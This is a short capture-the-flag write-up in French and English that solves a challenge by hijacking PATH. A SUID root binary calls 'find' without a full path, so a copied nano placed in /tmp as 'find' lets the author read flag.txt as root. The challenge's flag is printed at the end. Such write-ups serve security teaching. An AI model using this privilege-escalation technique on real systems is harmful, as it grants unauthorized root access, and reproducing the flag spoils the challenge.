# Operation Dark Sabotage 1

## Write-up FR

On remarque que le binaire `exe` est un exécutable `SUID` :
```bash
$ ls -la exe 
-rwsr-xr-x 1 root root 16208 Jan 22 01:56 ex
```

En analysant son code source, on constate qu'il exécute la commande `find -L` sans spécifier de chemin absolu. Cela signifie qu'il cherche l'exécutable `find` dans les répertoires définis par la variable `PATH`. Or, nous contrôlons cette variable, ce qui nous permet de détourner l'exécution en substituant `find` par un autre programme acceptant l'option `-L`.

Exemple d'exploitation en remplaçant `find` par `nano` :
```bash
$ cp /usr/bin/nano /tmp/find
$ export PATH=/tmp:$PATH
./exe flag.txt
```

## Write-up EN

We notice that the `exe` binary is a `SUID` executable:
```bash
$ ls -la exe 
-rwsr-xr-x 1 root root 16208 Jan 22 01:56 ex
```

By analyzing its source code, we see that it executes the `find -L` command without specifying an absolute path. This means it searches for the `find` executable in the directories defined by the `PATH` variable. Since we control this variable, we can hijack the execution by replacing `find` with another program that supports the `-L` option.

Example of exploitation by replacing `find` with `nano`:
```bash
$ cp /usr/bin/nano /tmp/find
$ export PATH=/tmp:$PATH
./exe flag.txt
```

## Flag

`polycyber{l0ng_l1v3_th3_3mp1r3}`